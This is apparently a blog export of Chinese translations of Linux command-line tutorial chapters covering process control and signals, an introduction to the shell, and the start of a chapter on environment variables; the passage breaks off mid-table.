<p>所有主要的桌面环境都提供了类似于top的图形应用程序（就像Windows中的任务管理器的工作方式），但top比图形版本更好，因为它更快，消耗的系统资源也少得多。毕竟，我们的系统监视程序不应该是我们试图跟踪的系统减速的来源。</p>
<h3 id="控制进程"><a href="#控制进程" class="headerlink" title="控制进程"></a>控制进程</h3><p>既然我们可以看到并监控进程，让我们对它们进行一些控制。对于我们的实验，我们将使用一个名为xlogo的小程序作为我们的实验对象。xlogo程序是X窗口系统（使我们显示屏上的图形动起来的底层引擎）提供的一个示例程序，它简单地显示一个包含X标志的可调整大小的窗口。首先，我们来了解一下我们的测试对象。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo</span><br></pre></td></tr></table></figure>

<p>在输入命令后，屏幕上应该会出现一个包含标志的小窗口。在某些系统上，xlogo可能会打印一个警告消息，但可以安全地忽略。</p>
<p><strong>提示：</strong> 如果您的系统没有包含xlogo程序，可以尝试使用gedit或kwrite代替。</p>
<p>我们可以通过调整其窗口大小来验证xlogo是否正在运行。如果标志以新的大小重新绘制，那么程序正在运行。</p>
<p>注意，我们的shell提示符还没有返回吗？这是因为shell正在等待程序完成，就像我们到目前为止使用的所有其他程序一样。如果我们关闭xlogo窗口，提示符将返回。</p>
<p><img src="/images/2024/Picture4.png"></p>
<p><em>图 4：xlogo程序</em></p>
<h4 id="中断进程"><a href="#中断进程" class="headerlink" title="中断进程"></a>中断进程</h4><p>让我们观察再次运行xlogo时会发生什么。首先，输入xlogo命令并验证程序正在运行。接下来，返回到终端窗口并按下Ctrl-c。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>在终端中，按下Ctrl-c会<em>中断</em>一个程序。这意味着我们礼貌地请求程序终止。按下Ctrl-c后，xlogo窗口关闭，shell提示符返回。</p>
<p>许多（但不是所有）命令行程序可以使用这种技术中断。</p>
<h4 id="将进程放入后台"><a href="#将进程放入后台" class="headerlink" title="将进程放入后台"></a>将进程放入后台</h4><p>假设我们想要在不终止xlogo程序的情况下恢复shell提示符。我们可以通过将程序放入<em>后台</em>来实现这一点。可以将终端视为具有<em>前台</em>（在表面上可见，如shell提示符）和<em>后台</em>（在表面后隐藏的内容）。为了启动一个程序并立即将其放入后台，我们在命令后加上一个&amp;符号。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 28236</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>输入命令后，xlogo窗口出现，shell提示符返回，但也打印了一些奇怪的数字。这条消息是shell功能中的一部分，称为<em>作业控制</em>。通过此消息，shell告诉我们已启动作业编号为1([1])，其进程ID为28236。如果我们运行ps，我们可以看到我们的进程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps</span><br><span class="line"> PID TTY TIME CMD</span><br><span class="line">10603 pts/1 00:00:00 bash</span><br><span class="line">28236 pts/1 00:00:00 xlogo</span><br><span class="line">28239 pts/1 00:00:00 ps</span><br></pre></td></tr></table></figure>

<p>shell的作业控制功能还为我们提供了一种列出从我们的终端启动的作业的方法。使用jobs命令，我们可以看到此列表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ jobs</span><br><span class="line">[1]+ Running xlogo &amp;</span><br></pre></td></tr></table></figure>

<p>结果显示我们有一个作业，编号为1，它正在运行，命令是xlogo &amp;。</p>
<h4 id="将进程返回到前台"><a href="#将进程返回到前台" class="headerlink" title="将进程返回到前台"></a>将进程返回到前台</h4><p>后台中的进程不受终端键盘输入的影响，包括使用Ctrl-c中断它的任何尝试。要将进程返回到前台，请使用以下方式的fg命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ jobs</span><br><span class="line">[1]+ Running xlogo &amp;</span><br><span class="line">[me@linuxbox ~]$ fg %1</span><br><span class="line">xlogo</span><br></pre></td></tr></table></figure>

<p>fg命令后跟一个百分号和作业编号（称为<em>jobspec</em>）就可以完成这个操作。如果我们只有一个后台作业，那么jobspec是可选的。要终止xlogo，按下Ctrl-c。</p>
<h4 id="暂停进程"><a href="#暂停进程" class="headerlink" title="暂停进程"></a>暂停进程</h4><p>有时，我们会想要暂停一个进程而不终止它。这通常是为了允许将前台进程移到后台。要暂停一个前台进程并将其放入后台，请按下Ctrl-z。让我们试一试。在命令提示符处，输入xlogo，按Enter键，然后按Ctrl-z：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo</span><br><span class="line">[1]+ Stopped xlogo</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>暂停xlogo后，我们可以通过尝试调整xlogo窗口的大小来验证该程序已停止。我们会看到它似乎已经停止了。我们可以使用fg命令在前台继续程序的执行，或者使用bg命令在后台恢复程序的执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ bg %1</span><br><span class="line">[1]+ xlogo &amp;</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>与fg命令一样，如果只有一个作业，则jobspec是可选的。</p>
<p>将进程从前台移到后台非常有用，如果我们从命令行启动一个图形程序，但忘记通过附加尾部的&amp;将其放入后台。</p>
<p>为什么我们要从命令行启动一个图形程序呢？有两个原因。</p>
<ul>
<li>我们想要运行的程序可能没有列在窗口管理器的菜单上（例如xlogo）。</li>
<li>通过从命令行启动程序，我们可能能够看到通常在图形启动时隐藏的错误消息。有时，从图形菜单启动时，程序可能无法启动。通过从命令行启动它，我们可能会看到一个错误消息，从而揭示问题。此外，一些图形程序具有有趣且有用的命令行选项。</li>
</ul>
<h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>kill命令用于“终止”进程。这使我们可以终止需要终止的程序。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 28401</span><br><span class="line">[me@linuxbox ~]$ kill 28401</span><br><span class="line">[1]+ Terminated xlogo</span><br></pre></td></tr></table></figure>

<p>首先，我们在后台启动xlogo。Shell会打印jobspec和后台进程的PID。接下来，我们使用kill命令并指定我们想要终止的进程的PID。我们也可以使用jobspec（例如%1）而不是PID来指定进程。</p>
<p>虽然这都很直接明了，但事实并非如此简单。kill命令并不完全“杀死”进程：它实际上是发送给它们<em>信号</em>。信号是操作系统与程序通信的几种方式之一。我们已经通过使用Ctrl-c和Ctrl-z看到了信号的效果。当终端接收到这些按键时，它会向前台程序发送一个信号。对于Ctrl-c，会发送一个名为INT（中断）的信号；对于Ctrl-z，会发送一个名为TSTP（终端停止）的信号。程序反过来会“监听”这些信号，并可能在接收到它们时采取行动。程序能够监听并根据信号采取行动的事实允许程序在收到终止信号时执行保存工作的操作。</p>
<h4 id="使用kill向进程发送信号"><a href="#使用kill向进程发送信号" class="headerlink" title="使用kill向进程发送信号"></a>使用kill向进程发送信号</h4><p>kill命令用于向程序发送信号。其最常见的语法看起来像这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill [-signal] PID...</span><br></pre></td></tr></table></figure>

<p>如果在命令行上没有指定信号，则默认发送TERM（终止）信号。kill命令最常用于发送以下信号：</p>
<p><em>Table 10-4: 常见信号</em></p>
<table>
<thead>
<tr>
<th><strong>编号</strong></th>
<th><strong>名称</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>HUP</td>
<td>挂断。这是早期终端连接到远程计算机的好日子的遗留。该信号用于指示控制终端已“挂断”。此信号的效果可以通过关闭终端会话来演示。运行在终端上的前台程序将收到该信号并终止。许多守护程序也使用此信号进行重新初始化，例如Apache Web服务器。</td>
</tr>
<tr>
<td>2</td>
<td>INT</td>
<td>中断。这与从终端发送的Ctrl-c执行相同的功能。它通常会终止一个程序。</td>
</tr>
<tr>
<td>9</td>
<td>KILL</td>
<td>杀死。这个信号是特殊的。当一个进程以这种方式被终止时，它不会有机会“清理”自己或保存其工作。因此，KILL信号只应作为其他终止信号失败时的最后手段。</td>
</tr>
<tr>
<td>15</td>
<td>TERM</td>
<td>终止。这是kill命令默认发送的信号。如果一个程序仍然“活跃”到可以接收信号，它将终止。</td>
</tr>
<tr>
<td>18</td>
<td>CONT</td>
<td>继续。这将在STOP或TSTP信号后恢复一个进程。这个信号由bg和fg命令发送。</td>
</tr>
<tr>
<td>19</td>
<td>STOP</td>
<td>停止。这个信号使进程暂停而不终止。</td>
</tr>
<tr>
<td>20</td>
<td>TSTP</td>
<td>终端停止。这是当按下Ctrl-z时终端发送的信号。与STOP信号不同，TSTP信号由程序接收，但程序可能选择忽略它。</td>
</tr>
</tbody></table>
<p>让我们尝试使用kill命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 13546</span><br><span class="line">[me@linuxbox ~]$ kill -1 13546</span><br><span class="line">[1]+ Hangup xlogo</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们在后台启动了xlogo程序，然后使用kill发送了一个HUP信号给它。xlogo程序终止了，并且shell指示后台进程已接收到一个挂断信号。在消息出现之前，我们可能需要按几次Enter键。请注意，信号可以通过数字或名称指定，包括以SIG开头的名称。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 13601</span><br><span class="line">[me@linuxbox ~]$ kill -INT 13601</span><br><span class="line">[1]+ Interrupt xlogo</span><br><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 13608</span><br><span class="line">[me@linuxbox ~]$ kill -SIGINT 13608</span><br><span class="line">[1]+ Interrupt xlogo</span><br></pre></td></tr></table></figure>

<p>重复上面的示例，并尝试其他信号。记住，我们也可以使用jobspecs代替PID。</p>
<p>与文件一样，进程也有所有者，您必须是进程的所有者（或超级用户）才能使用kill向其发送信号。</p>
<p>除了上面列出的与kill一起最常使用的信号外，系统还经常使用如下表10-5所列的其他信号。</p>
<p><em>Table 10-5: 其他常见信号</em></p>
<table>
<thead>
<tr>
<th><strong>编号</strong></th>
<th><strong>名称</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>3</td>
<td>QUIT</td>
<td>退出。</td>
</tr>
<tr>
<td>11</td>
<td>SEGV</td>
<td>分段违规。如果程序非法使用内存，也就是说，它尝试写入它不被允许写入的地方，将发送此信号。</td>
</tr>
<tr>
<td>28</td>
<td>WINCH</td>
<td>窗口改变。这是当窗口改变大小时系统发送的信号。一些程序，如top和less，将响应此信号，以适应新的窗口尺寸进行重绘。</td>
</tr>
</tbody></table>
<p>对于好奇的人，可以使用以下命令显示完整的信号列表：</p>
<h4 id="使用killall向多个进程发送信号"><a href="#使用killall向多个进程发送信号" class="headerlink" title="使用killall向多个进程发送信号"></a>使用killall向多个进程发送信号</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ kill -l</span><br></pre></td></tr></table></figure>

<p>使用killall命令，还可以向匹配指定程序或用户名的多个进程发送信号。以下是语法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">killall [-u user] [-signal] name...</span><br></pre></td></tr></table></figure>

<p>为了演示，我们将启动几个xlogo程序的实例，然后终止它们。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[1] 18801</span><br><span class="line">[me@linuxbox ~]$ xlogo &amp;</span><br><span class="line">[2] 18802</span><br><span class="line">[me@linuxbox ~]$ killall xlogo</span><br><span class="line">[1]- Terminated xlogo</span><br><span class="line">[2]+ Terminated xlogo</span><br></pre></td></tr></table></figure>

<p>请记住，与kill一样，我们必须具有超级用户权限，才能向不属于我们的进程发送信号。</p>
<h3 id="关闭系统"><a href="#关闭系统" class="headerlink" title="关闭系统"></a>关闭系统</h3><p>关闭系统的过程涉及有序终止系统上的所有进程，并在系统关机前执行一些重要的维护任务（例如同步所有挂载的文件系统）。有四个命令可以执行此功能。它们是halt、poweroff、reboot和shutdown。前三个命令相当直观，并且通常不使用任何命令行选项。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo reboot</span><br></pre></td></tr></table></figure>

<p>shutdown命令稍微有点有趣。使用它，我们可以指定要执行的操作（halt、power down或reboot），并为关闭事件提供时间延迟。最常用的方式是这样来停止系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo shutdown -h now</span><br></pre></td></tr></table></figure>

<p>或者像这样重新启动系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo shutdown -r now</span><br></pre></td></tr></table></figure>

<p>延迟可以以多种方式指定。有关详细信息，请参阅shutdown的man页面。执行shutdown命令后，会向所有登录用户“广播”一个消息，警告他们即将发生的事件。</p>
<h3 id="更多与进程相关的命令"><a href="#更多与进程相关的命令" class="headerlink" title="更多与进程相关的命令"></a>更多与进程相关的命令</h3><p>由于监控进程是一个重要的系统管理任务，因此有很多相关的命令。表10-6列出了一些可以尝试的命令：</p>
<p><em>表10-6：其他与进程相关的命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>pstree</td>
<td>输出一个按树状模式排列的进程列表，显示进程之间的父子关系。</td>
</tr>
<tr>
<td>vmstat</td>
<td>输出包括内存、交换和磁盘I&#x2F;O在内的系统资源使用的快照。要看到持续的显示，请在命令后跟一个时间延迟（以秒为单位）来更新。例如：vmstat 5。使用Ctrl-c终止输出。</td>
</tr>
<tr>
<td>xload</td>
<td>一个绘制系统负载随时间变化的图形的图形程序。</td>
</tr>
<tr>
<td>tload</td>
<td>类似于xload程序，但在终端中绘制图形。使用Ctrl-c终止输出。</td>
</tr>
</tbody></table>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>大多数现代系统都具有管理多个进程的机制。Linux为此提供了丰富的工具集。鉴于Linux是全球部署最多的服务器操作系统，这是非常合理的。然而，与某些其他系统不同，Linux主要依赖命令行工具进行进程管理。虽然Linux有图形进程工具，但由于其速度和轻量级占用，命令行工具受到了极大的青睐。尽管GUI工具看起来很漂亮，但它们经常会增加系统负载，这在某种程度上有悖于初衷。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是Shell？</title>
    <url>/2024/03/1-what-is-the-shell/</url>
    <content><![CDATA[<h1 id="第一部分-学习Shell"><a href="#第一部分-学习Shell" class="headerlink" title="第一部分 - 学习Shell"></a>第一部分 - 学习Shell</h1><h2 id="1-什么是Shell？"><a href="#1-什么是Shell？" class="headerlink" title="1 - 什么是Shell？"></a>1 - 什么是Shell？</h2><p>当我们谈论命令行时，我们实际上是在提到<em>shell</em>。Shell是一个接收键盘命令并将它们传递给操作系统执行的程序。几乎所有的Linux发行版都提供了一个来自GNU项目的shell程序，名为bash。名称“bash”是“Bourne Again SHell”的首字母缩写，这是对bash是sh的增强替代的指称，而sh是由Steve Bourne编写的原始Unix shell程序。</p>
<span id="more"></span>

<h3 id="终端仿真器"><a href="#终端仿真器" class="headerlink" title="终端仿真器"></a>终端仿真器</h3><p>在使用图形用户界面（GUI）时，我们需要另一个名为<em>终端仿真器</em>的程序与shell进行交互。如果我们查看桌面菜单，可能会找到一个。KDE使用konsole，GNOME使用gnome-terminal，尽管在菜单上可能简称为“terminal”。对于Linux，还有许多其他终端仿真器可用，但它们基本上都执行相同的功能；为我们提供对shell的访问。你可能会根据它拥有的功能来偏好某个终端仿真器。</p>
<h3 id="进行你的第一次按键"><a href="#进行你的第一次按键" class="headerlink" title="进行你的第一次按键"></a>进行你的第一次按键</h3><p>那么让我们开始吧。启动终端仿真器！一旦它启动，我们应该会看到类似于这样的东西：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>这被称为<em>shell提示符</em>，当shell准备好接受输入时，它将出现。虽然它的外观可能因发行版而异，但通常会包括你的<em>用户名@机器名</em>，后面是当前工作目录（稍后会详细介绍）和一个美元符号。</p>
<blockquote>
<p>注意：如果提示符的最后一个字符是井号（“#”）而不是美元符号，则终端会话具有<em>超级用户</em>特权。这意味着我们要么以root用户登录，要么选择了一个提供超级用户（管理员）特权的终端仿真器。</p>
</blockquote>
<p>假设到目前为止一切都很顺利，让我们尝试一些输入。在提示符处输入一些无关紧要的内容，就像这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ kaekfjaeifj</span><br></pre></td></tr></table></figure>

<p>因为这个命令毫无意义，shell告诉我们，并给了我们另一次机会。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash: kaekfjaeifj: command not found [me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<h3 id="命令历史"><a href="#命令历史" class="headerlink" title="命令历史"></a>命令历史</h3><p>如果我们按向上箭头键，我们会看到先前的命令kaekfjaeifj重新出现在提示符后面。这就是<em>命令历史</em>。大多数Linux发行版默认记住最近的1000个命令。按向下箭头键，先前的命令会消失。</p>
<h3 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h3><p>再次按向上箭头键召回前一个命令。如果我们尝试左右箭头键，我们将看到如何将光标定位在命令行的任何位置。这使得编辑命令变得很容易。</p>
<h3 id="关于鼠标和焦点的一些建议"><a href="#关于鼠标和焦点的一些建议" class="headerlink" title="关于鼠标和焦点的一些建议"></a>关于鼠标和焦点的一些建议</h3><p>虽然shell主要是通过键盘完成的，但你也可以在终端仿真器中使用鼠标。X Window System（GUI的底层引擎）内置了一种支持快速复制和粘贴的机制。如果你通过按住左鼠标按钮并在文本上拖动鼠标（或双击一个单词）来突出显示一些文本，它将被复制到X维护的缓冲区中。按下中间鼠标按钮将导致文本被粘贴到光标位置。试一试。</p>
<p><strong>注意</strong>：不要试图在终端窗口内使用Ctrl-c和Ctrl-v执行复制和粘贴。它们不起作用。这些控制代码对shell有不同的含义，并且在发布Microsoft Windows许多年之前被分配。</p>
<p>你的图形桌面环境（很可能是KDE或GNOME），为了像Windows一样运行，可能将其<em>焦点策略</em>设置为“点击获取焦点”。这意味着要使窗口获得焦点（变为活动状态），你需要点击它。这与传统的X行为“焦点跟随鼠标”相反，这意味着窗口只需通过鼠标滑过即可获得焦点。窗口直到你点击它之前不会浮到最前面，但它将能够接收输入。将焦点策略设置为“焦点跟随鼠标”将使复制和粘贴技术更加有用。如果可能的话，请试试（某些桌面环境，如Ubuntu的Unity，不再支持它）。我认为如果你给它一个机会，你会喜欢它的。你会在你的窗口管理器的配置程序中找到这个设置。</p>
<h3 id="尝试一些简单的命令"><a href="#尝试一些简单的命令" class="headerlink" title="尝试一些简单的命令"></a>尝试一些简单的命令</h3><p>现在我们已经学会在终端仿真器中输入文本，让我们尝试一些简单的命令。我们从<code>date</code>命令开始，它显示当前的时间和日期。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ date</span><br></pre></td></tr></table></figure>

<p>显示结果可能类似于：</p>
<pre><code>Thu Mar 8 15:09:41 EST 2018
</code></pre>
<p>一个相关的命令是<code>cal</code>，它默认显示当前月份的日历。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cal</span><br></pre></td></tr></table></figure>

<p>显示结果可能类似于：</p>
<pre><code>   March 2018    
Su Mo Tu We Th Fr Sa 
                          1  2  3
 4 	5  6  7  8  9 10
11 12 13 14 15 16 17
18 19 20 21 22 23 24
25 26 27 28 29 30 31
</code></pre>
<p>要查看磁盘驱动器上的当前可用空间量，请输入<code>df</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ df</span><br></pre></td></tr></table></figure>

<p>显示结果可能类似于：</p>
<pre><code>Filesystem      1K-blocks   Used Available Use% Mounted on
/dev/sda2       15115452  5012392  9949716 34% /
/dev/sda5       59631908 26545424 30008432 47% /home 
/dev/sda1       147764   17370  122765 13% /boot 
tmpfs          	256856     0  256856  0% /dev/shm
</code></pre>
<p>同样，要显示可用内存的量，请输入<code>free</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ free</span><br></pre></td></tr></table></figure>

<p>显示结果可能类似于：</p>
<pre><code>     total    used    free   shared  buffers   cached 
Mem:  513712   503976    9736     0    5312   122916
-/+ buffers/cache: 375748   137964
Swap: 1052248   104712   947536
</code></pre>
<h3 id="结束终端会话"><a href="#结束终端会话" class="headerlink" title="结束终端会话"></a>结束终端会话</h3><p>我们可以通过关闭终端仿真器窗口、在shell提示符处输入<code>exit</code>命令或按Ctrl-d来结束终端会话。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ exit</span><br></pre></td></tr></table></figure>

<h3 id="幕后的控制台"><a href="#幕后的控制台" class="headerlink" title="幕后的控制台"></a>幕后的控制台</h3><p>即使我们没有终端仿真器运行，许多终端会话仍在图形桌面的后面运行。我们可以通过在大多数Linux发行版上按Ctrl-Alt-F1到Ctrl-Alt-F6来访问这些会话，这些会话被称为<em>虚拟终端</em>或<em>虚拟控制台</em>。当访问一个会话时，它会呈现一个登录提示符，我们可以在其中输入用户名和密码。要从一个虚拟控制台切换到另一个虚拟控制台，请按Alt-F1到Alt-F6。在大多数系统上，我们可以通过按Alt-F7返回到图形桌面。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本章标志着我们进入Linux命令行的开始，介绍了shell并简要了解了命令行，以及如何启动和结束终端会话的方法。我们还学会了如何发出一些简单的命令并进行一些轻松的命令行编辑。这并不可怕，对吧？</p>
<p>在下一章中，我们将学习一些更多的命令并在Linux文件系统中漫游。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>要了解Bourne Shell之父Steve Bourne的更多信息，请参阅此Wikipedia文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TdGV2ZV9Cb3VybmU=">Steve Bourne<i class="fa fa-external-link-alt"></i></span></li>
<li>这篇Wikipedia文章介绍了bash的原始作者Brian Fox：<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQnJpYW5fRm94Xyhjb21wdXRlcl9wcm9ncmFtbWVyKQ==">Brian Fox (computer programmer)<i class="fa fa-external-link-alt"></i></span></li>
<li>这篇文章介绍了计算机中关于shell概念的内容：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TaGVsbF8oY29tcHV0aW5nKQ==">Shell (computing)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>环境</title>
    <url>/2024/03/11-the-environment/</url>
    <content><![CDATA[<h1 id="第二部分-–-配置与环境"><a href="#第二部分-–-配置与环境" class="headerlink" title="第二部分 – 配置与环境"></a>第二部分 – 配置与环境</h1><h2 id="11-–-环境"><a href="#11-–-环境" class="headerlink" title="11 – 环境"></a>11 – 环境</h2><p>如我们之前所讨论的，shell 在我们的 shell 会话期间维护了一个称为 <em>环境</em> 的信息体系。程序使用存储在环境中的数据来确定关于系统配置的事实。虽然大多数程序使用 <em>配置文件</em> 存储程序设置，但某些程序还会查找存储在环境中的值来调整其行为。了解这一点，我们可以使用环境来定制我们的 shell 体验。</p>
<span id="more"></span>

<p>在这一章中，我们将使用以下命令：</p>
<ul>
<li>printenv – 打印环境的部分或全部内容</li>
<li>set – 设置 shell 选项</li>
<li>export – 将环境导出给随后执行的程序</li>
<li>alias – 为命令创建别名</li>
</ul>
<p><strong>环境中存储了什么？</strong></p>
<p>shell 在环境中存储了两种基本类型的数据；尽管在 bash 中，这些类型很难区分。它们是 <em>环境变量</em> 和 <em>shell 变量</em>。shell 变量是由 bash 放置在那里的数据片段，而环境变量是其他所有内容。除了变量之外，shell 还存储一些程序化数据，即 <em>别名</em> 和 <em>shell 函数</em>。我们在第5章“使用命令”中涵盖了别名，而我们将在第4部分中涵盖与 shell 脚本相关的 shell 函数。</p>
<h3 id="检查环境"><a href="#检查环境" class="headerlink" title="检查环境"></a>检查环境</h3><p>要查看环境中存储了什么，我们可以使用 bash 中的 set 内置命令或 printenv 程序。set 命令将显示 shell 和环境变量，而 printenv 仅显示后者。由于环境内容的列表会相当长，因此最好将任一命令的输出导入到 less 中进行查看。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ printenv | less</span><br></pre></td></tr></table></figure>

<p>通过这样做，我们应该会看到以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">USER=me</span><br><span class="line">PAGER=less</span><br><span class="line">LSCOLORS=Gxfxcxdxbxegedabagacad</span><br><span class="line">XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/usr/share/upstart/xdg:/etc/xdg</span><br><span class="line">PATH=/home/me/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/</span><br><span class="line">sbin:/bin:/usr/games:/usr/local/games</span><br><span class="line">DESKTOP_SESSION=ubuntu</span><br><span class="line">QT_IM_MODULE=ibus</span><br><span class="line">QT_QPA_PLATFORMTHEME=appmenu-qt5</span><br><span class="line">JOB=dbus</span><br><span class="line">PWD=/home/me</span><br><span class="line">XMODIFIERS=@im=ibus</span><br><span class="line">GNOME_KEYRING_PID=1850</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">GDM_LANG=en_US</span><br><span class="line">MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path</span><br><span class="line"> MASTER_HOST=linuxbox</span><br><span class="line">IM_CONFIG_PHASE=1</span><br><span class="line">COMPIZ_CONFIG_PROFILE=ubuntu</span><br><span class="line">GDMSESSION=ubuntu</span><br><span class="line">SESSIONTYPE=gnome-session</span><br><span class="line">XDG_SEAT=seat0</span><br><span class="line">HOME=/home/me</span><br><span class="line">SHLVL=2</span><br><span class="line">LANGUAGE=en_US</span><br><span class="line">GNOME_DESKTOP_SESSION_ID=this-is-deprecated</span><br><span class="line">LESS=-R</span><br><span class="line">LOGNAME=me</span><br><span class="line">COMPIZ_BIN_PATH=/usr/bin/</span><br><span class="line">LC_CTYPE=en_US.UTF-8</span><br><span class="line">XDG_DATA_DIRS=/usr/share/ubuntu:/usr/share/gnome:/usr/local/share/:/</span><br><span class="line">usr/share/</span><br><span class="line">QT4_IM_MODULE=xim</span><br><span class="line">DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-IwaesmWaT0</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">INSTANCE=</span><br></pre></td></tr></table></figure>

<p>我们看到的是环境变量及其值的列表。例如，我们看到一个名为 USER 的变量，其包含值 me。printenv 命令还可以列出特定变量的值。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ printenv USER</span><br><span class="line">me</span><br></pre></td></tr></table></figure>

<p>当不使用选项或参数使用 set 命令时，它将显示 shell 和环境变量，以及任何定义的 shell 函数。与 printenv 不同，它的输出是按字母顺序排序的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ set | less</span><br></pre></td></tr></table></figure>

<p>还可以使用 echo 命令查看变量的内容，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ echo $HOME</span><br><span class="line">/home/me</span><br></pre></td></tr></table></figure>

<p>环境的一个元素，既不是 set 也不是 printenv 显示的是别名。要查看它们，请输入不带参数的 alias 命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ alias</span><br><span class="line">alias l.=&#x27;ls -d .* --color=tty&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=tty&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=tty&#x27;</span><br><span class="line">alias vi=&#x27;vim&#x27;</span><br><span class="line">alias which=&#x27;alias | /usr/bin/which --tty-only --read-alias --showdot --show-tilde&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="一些有趣的变量"><a href="#一些有趣的变量" class="headerlink" title="一些有趣的变量"></a>一些有趣的变量</h3><p>环境包含许多变量，尽管环境与此处展示的可能不同，但我们在我们的环境中可能会看到表11-1中列出的变量。</p>
<p><em>表11-1：环境变量</em></p>
<table>
<thead>
<tr>
<th><strong>变量</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>DISPLAY</td>
<td>如果我们运行图形环境，则显示名称。通常这是“:0”，意味着由X服务器生成的第一个显示。</td>
</tr>
<tr>
<td>EDITOR</td>
<td>用于文本编辑的程序名称。</td>
</tr>
<tr>
<td>SHELL</td>
<td>用户默认 shell 程序的名称。</td>
</tr>
<tr>
<td>HOME</td>
<td>您的主目录的路径名。</td>
</tr>
<tr>
<td>LANG</td>
<td>定义您的语言的字符集和排序顺序。</td>
</tr>
<tr>
<td>OLDPWD</td>
<td>之前的工作目录。</td>
</tr>
<tr>
